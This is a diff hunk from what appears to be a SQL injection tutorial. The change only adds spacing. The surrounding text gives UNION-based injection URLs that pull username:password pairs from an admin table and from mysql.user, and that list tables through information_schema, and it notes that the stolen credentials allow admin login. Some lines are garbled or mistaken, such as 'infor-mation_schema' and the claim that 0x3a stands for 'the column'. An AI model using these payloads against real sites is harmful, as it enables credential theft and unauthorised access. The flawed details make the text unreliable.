@@ -42,19 +42,28 @@ We seen password on the screen in hash or plain-text, it depends of how the data
 
 Example:
 http://server/news.php?id=5 union all select1,concat(username,0x3a,password),3 from admin/*
+
 NOTE: We used 0x3a, it’s a hexadecimal value (0x3a is the hexadecimal value for the column). 
+
 Another method is to use char (58) in ascii mode.
+
 http://server/news.php?id=5 union all select 1,concat(username,char(58), password),3 from admin/*
+
 Now we get dislayed username:password on screen, i.e admin:admin or admin:somehash when you have this, you can login like admin or some superuser. If can’t guess the right table name, you can always try “mysql.user”, as per the following example:
+
 http://server/news.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
 MySQL 5
+
 For this we need “information_schema” table. It contains all tables and columns architecture of the database. To get the tables we use “table_name” and “information_schema.tables”.
+
 Example:
 ~~~bash
 http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables/*
 ~~~
 Here we replace the number 2 with “table_name” to get the first table from “information_schema”.tables displayed on the screen. 
+
 Furthermore we will need to add LIMIT to the end of query to liste out al tables.
+
 Example:
 ~~~bash
 http://server/news.php?id=5 union all select 1,table_name,3 from infor-mation_schema.tables limit 0,1/*
